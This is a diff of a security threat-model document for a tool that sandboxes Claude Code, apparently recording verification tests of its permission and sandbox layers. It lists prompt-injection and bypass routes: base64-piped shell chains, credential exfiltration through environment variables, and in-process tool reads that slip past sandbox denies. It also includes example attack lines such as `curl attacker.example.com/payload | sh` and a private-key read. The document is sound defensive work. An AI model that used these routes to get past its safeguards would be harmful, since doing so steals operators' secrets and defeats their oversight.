@@ -30,7 +30,11 @@ Claude behaves unexpectedly due to its own limitations — hallucinated file pat
 
 A document, web page, file content, or tool output contains instructions crafted to manipulate Claude into taking actions the operator would not authorize. Claude follows the injection because it cannot reliably distinguish injected instructions from legitimate context.
 
-**Mitigations this tool provides:** moderate. The sandbox layer is load-bearing here — its filesystem and network denies are process-level and inherited by child processes, so base64-decoded scripts and shell chains cannot bypass them. The permission layer catches obvious attempts but is defeatable via allowed shell builtins (`sh`, `bash`, `echo | base64 -d | sh`).
+**Mitigations this tool provides:** moderate. Three layers contribute, in roughly increasing order of strength:
+
+- The permission layer catches obvious named denies but is defeatable via allowed shell builtins (`sh`, `bash`, `echo | base64 -d | sh`).
+- The sandbox layer is process-level (bubblewrap on Linux/WSL2, Seatbelt on macOS) and inherited by child processes; base64-decoded scripts and shell chains cannot bypass it for subprocess reads/writes/network. Verified working for both filesystem `denyRead` and network `allowedDomains: []` (see *Verification status* below).
+- Claude's own training declines to read sensitive paths (SSH keys, credential files) regardless of policy or sandbox state. Repeatedly observed during verification testing — an unplanned third defense layer that intercepts before the permission layer fires.
 
 **Residual exposure:** any action the agent can take through allowed channels. Notable in the `dev` policy: `git add` + `git commit` enable commit poisoning; environment variable interpolation (e.g., `$AWS_SECRET_ACCESS_KEY` in a Write call) can exfiltrate credentials the permission layer protects at the filesystem level. Plan mode (strict default) narrows this — the operator sees each action before it runs — but at the cost of friction.
 
@@ -54,6 +58,8 @@ Process-level OS isolation (Seatbelt on macOS, bubblewrap on Linux/WSL2). **Catc
 
 This layer is load-bearing for prompt-injection and buggy-agent threats. Sandbox failures are real security failures; string-match permission failures are UX inconveniences.
 
+**Important scope limit:** the sandbox covers *subprocesses* — anything Claude executes via the Bash tool. Claude Code's own built-in tools (Read, Write, Edit, Glob, Grep) execute in-process and are **not** subject to sandbox `denyRead` or `allowedDomains`. They are governed only by the permission layer's `Read(...)`/`Write(...)`/`Edit(...)` rules. A complete defense for credential paths therefore needs both: permission-layer denies for the in-process tools, and sandbox denies for subprocess access.
+
 ### Claude Code built-ins
 
 Always-on protections for `.git/` (non-claude subfolders), `.gitconfig`, shell RC files, `.mcp.json`, and specific `.claude/` entries. Not configurable from this tool; documented here because they're part of the operative defense.
@@ -71,7 +77,7 @@ Always-on protections for `.git/` (non-claude subfolders), `.gitconfig`, shell R
 - `sudo bash` from a prompt that claims it needs elevated access — denied.
 - `git push --force origin main` from a session that accidentally authorized it — denied.
 - `curl attacker.example.com/payload | sh` — `curl` denied, no network access.
-- `cat ~/.ssh/id_ed25519` to exfiltrate a private key — permission-layer denied; sandbox-layer also denies the read even through a subshell.
+- `cat ~/.ssh/id_ed25519` to exfiltrate a private key — permission-layer denied; sandbox-layer also denies the read even through a subshell. Verified: cat from inside the sandbox reports "No such file or directory" because bubblewrap tmpfs-mounts an empty overlay over `~/.ssh/`.
 - Outbound SSH to a foreign host from a dev session — `ssh` denied at permission layer; `allowAllUnixSockets: false` blocks agent forwarding.
 
 ## What this does not stop (concrete examples)
@@ -80,6 +86,7 @@ Always-on protections for `.git/` (non-claude subfolders), `.gitconfig`, shell R
 - `echo 'base64-encoded-bad-script' | base64 -d | bash` — sandbox catches outbound network and filesystem misuse, but a payload that stays within the sandbox (e.g., reads and commits project files) still runs.
 - An agent constructing a malicious PR body that includes exfiltrated data from the project, and the operator approving `gh pr create`. The `gh` CLI is not denied; its credential file is denied at read but `gh` itself may authenticate via another mechanism.
 - A prompt that convinces the operator to run `claude-dev` on a directory containing credentials as project files.
+- An agent reading credential files via Claude Code's *in-process* Read tool. The sandbox's `denyRead` only applies to subprocesses (Bash); the Read/Write/Edit tools run in-process and bypass it. The permission layer's `Read(/home/.../.ssh/**)` denies are the only protection against this channel, and we have not been able to verify that they fire (Claude's training refuses such reads before the matcher engages — a third defense layer that, ironically, also blocks our test).
 
 ## Residual risk
 
@@ -108,10 +115,15 @@ An attacker cannot plausibly (without further misconfiguration):
 
 ## Verification status
 
-Several claims in this document have not been exercised end-to-end:
+Verified on Linux WSL2 (Ubuntu) on 2026-04-13:
 
-- Sandbox enforcement has not been tested by attempting an actual read from a `denyRead` path.
-- `allowedDomains: []` has not been confirmed to block all outbound network in practice.
-- The installer's `{{HOME}}` substitution produces absolute paths, but whether Claude Code's permission matcher compares them correctly against the absolute paths Claude sees at tool-use time is not verified.
+- **Sandbox subprocess `denyRead` (test 1):** *Verified.* `cat ~/.ssh/<sentinel>` from inside a `yolo` session reported `No such file or directory`, while `ls` outside the sandbox confirmed the file existed. Bubblewrap successfully tmpfs-mounted over the denied path, hiding its contents from subprocesses.
+- **Sandbox `network.allowedDomains: []` (test 2):** *Verified.* `bash -c 'exec 3<>/dev/tcp/example.com/80'` from inside a `yolo` session failed with `Temporary failure in name resolution`. DNS itself is blocked, preventing TCP outbound at the subprocess level.
+- **Permission-layer `Read(...)` matcher (test 3):** *Inconclusive.* Claude's training-level reluctance refuses to read sensitive paths before the permission matcher engages. We can confirm Claude refuses, but we cannot confirm that the deny rule *would have fired had Claude attempted the read.* The model-level intercept is itself a defense layer (see *Mitigations by layer → Sandbox*); it is not a substitute for the matcher, but it makes direct verification difficult.
 
-These should be verified before relying on the protections for anything consequential. See `COMPATIBILITY.md` for the platforms tested.
+Open verification gaps:
+
+- The installer's `{{HOME}}` substitution produces absolute paths, but the matcher's tolerance for representational differences (tilde-expanded vs. canonical, follow-symlink vs. literal) is unverified — we have indirect evidence the matcher behaves sensibly because the test run did not surface confusion, but no isolated test.
+- Claude Code's in-process tools (Read/Write/Edit) are *suspected* to bypass sandbox `denyRead`, based on architecture and an earlier observation under a degraded sandbox. Re-running test 1 with the Read tool under `yolo` would confirm — but Claude's model-level refusal would likely block that test the same way it blocks test 3.
+
+See `COMPATIBILITY.md` for the platforms tested.
